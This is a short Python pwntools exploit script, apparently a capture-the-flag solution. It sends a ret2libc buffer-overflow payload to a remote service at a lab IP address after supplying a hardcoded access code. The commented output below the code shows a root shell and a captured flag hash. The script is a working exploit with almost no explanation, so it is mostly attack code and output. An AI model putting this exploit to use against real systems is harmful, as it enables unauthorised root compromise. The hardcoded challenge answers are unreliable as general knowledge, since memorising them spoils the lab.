#!/usr/bin/env python3

from pwn import *


system_addr = p32(0xF7E4C060)
exit_addr = p32(0xF7E3FAF0)
sh_addr = p32(0xF7F6DDD5)

payload = b"A" * 212 + system_addr + exit_addr + sh_addr

r = remote("10.129.212.102", 32812)
r.recvuntil("Enter Bridge Access Code:")
r.sendline("picarda1")
r.recvuntil("Waiting for input:")
r.sendline("4")
r.recvuntil("Enter Security Override:")
r.sendline(payload)
r.interactive()


# ᐅ python3 root.py
# [+] Opening connection to 10.129.212.102 on port 32812: Done
# root.py:13: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
#   r.recvuntil("Enter Bridge Access Code:")
# root.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
#   r.sendline("picarda1")
# root.py:15: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
#   r.recvuntil("Waiting for input:")
# root.py:16: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
#   r.sendline("4")
# root.py:17: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
#   r.recvuntil("Enter Security Override:")
# [*] Switching to interactive mode

# $ whoami
# root
# $ cat /root/root.txt
# b9b31ae1d6a4f86d74867616d5bbcfe0